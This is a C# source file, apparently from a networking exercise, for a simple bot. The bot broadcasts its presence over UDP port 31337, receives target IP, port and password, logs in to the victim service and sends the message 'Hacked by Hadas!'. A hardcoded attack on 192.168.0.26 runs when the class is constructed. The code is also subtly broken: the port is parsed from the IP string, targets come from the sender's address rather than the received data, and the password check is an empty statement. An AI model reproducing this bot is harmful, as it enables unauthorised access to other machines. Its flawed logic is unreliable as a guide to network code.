using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace bot
{

    class BotServer
    {
        private readonly string newline_delimeter = "\r\n";
        Thread broadcast_thread;
        private String hacked_message = "Hacked by Hadas!\r\n";
        private int listening_port;
        private static System.Timers.Timer timer;
        private IPAddress brodcast = IPAddress.Parse("255.255.255.255");
        UdpClient listener;
        IPEndPoint localEndPoint;
        Socket udp_socket;

        public BotServer()
        {
            //initial();
            //broadcast_thread = new Thread(new ThreadStart(activate_timer));
            //listening_to_bot();
            attack("192.168.0.26", 2019, "passssap");
        }

        public void initial()
        {
            //initial
            Random random = new Random();
            listening_port = random.Next(1000, 9999);
            Console.Write(listening_port);//for fun
        }

        public void activate_timer()
        {
            //timer - bot announcement
            int sec = 1000;
            int num_of_sec = 10;
            System.Timers.Timer timer = new System.Timers.Timer(sec * num_of_sec);
            timer.Elapsed += bot_announcement;
            timer.Enabled = true;
        }

        public void listening_to_bot()
        {
            bool done = false;
            listener = new UdpClient(listening_port);
            localEndPoint = new IPEndPoint(IPAddress.Parse("172.16.15.50"), listening_port);
            udp_socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
            string received_data;
            byte[] receive_byte_array;
            try
            {
                while (!done)
                {
                    Console.WriteLine("Waiting for broadcast");
                    receive_byte_array = listener.Receive(ref localEndPoint);
                    String massage = localEndPoint.ToString();
                    Console.WriteLine("Received a broadcast from {0}", massage);
                    String[] information = massage.Split(',');
                    if (information.Length > 2)
                    {
                        String ip_address = information[0];
                        int port;
                        try
                        {
                            port = Int32.Parse(ip_address);
                        } catch (Exception e) {
                            port = -1;
                        }
                        String password = information[2];
                        attack(ip_address, port, password);
                    }
                    /*received_data = Encoding.ASCII.GetString(receive_byte_array, 0, receive_byte_array.Length);
                    Console.WriteLine("data follows \n{0}\n\n", received_data);*/
                }
            }
            catch (Exception e)
            {
                Console.WriteLine(e.ToString());
            }
            listener.Close();
        }

        public void bot_announcement(Object source, System.Timers.ElapsedEventArgs e)
        {
            IPEndPoint ipep = new IPEndPoint(brodcast, 31337);
            udp_socket.Connect(ipep);
            String port = listening_port.ToString();
            byte[] buffer = Encoding.ASCII.GetBytes(port);
            udp_socket.Send(buffer, 4, SocketFlags.None);
        }

        private bool reached_message_end(byte[] rcv_buffer, int offset, int readBytes)
        {
            if (offset < readBytes - 1 && offset < rcv_buffer.Length - 1)
            {
                byte[] maybe_delimeter = { rcv_buffer[offset], rcv_buffer[offset + 1] };
                return Encoding.ASCII.GetString(maybe_delimeter).Equals(newline_delimeter);
            }
            else
            {
                return false;
            }
        }

        private string receive(Socket client, int msg_size)
        {
            string ans = "";
            byte[] rcv_buffer = new byte[msg_size];
            int offset = 0;
            int readBytes = client.Receive(rcv_buffer, msg_size, SocketFlags.None);
            while (!reached_message_end(rcv_buffer, offset, readBytes))
            {
                byte[] tmp = { rcv_buffer[offset] };
                ans += Encoding.ASCII.GetString(tmp);
                offset++;
            }
            if (offset == 0)
            {
                //handleNoResponse(client);
            }
            return ans;
        }

        public void attack(string ip, int port, string pass)
        {
            if (port > -1) {
                IPAddress victimAddress = IPAddress.Parse(ip);
                IPEndPoint ipep = new IPEndPoint(victimAddress, port);
                Socket server = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                try {
                    server.Connect(ipep);
                    //Socket server = socket.Accept();
                    string response = receive(server, 100);
                    // check if the input is ok
                    if (String.Equals(response, "Please enter your password", StringComparison.OrdinalIgnoreCase)) ;
                    byte[] buffer = Encoding.ASCII.GetBytes(pass + "\r\n");
                    server.Send(buffer, pass.Length + "\r\n".Length, SocketFlags.None);
                    try {
                        response = receive(server, 100);
                        if (String.Equals(response, "Access granted", StringComparison.OrdinalIgnoreCase))
                        {
                            buffer = Encoding.ASCII.GetBytes(hacked_message + "\r\n");
                            server.Send(buffer, hacked_message.Length, SocketFlags.None);
                            int i = 10;
                        }
                    }
                    catch (Exception e) { }
                }
                catch (Exception e) { }

            }

        }
    }
}
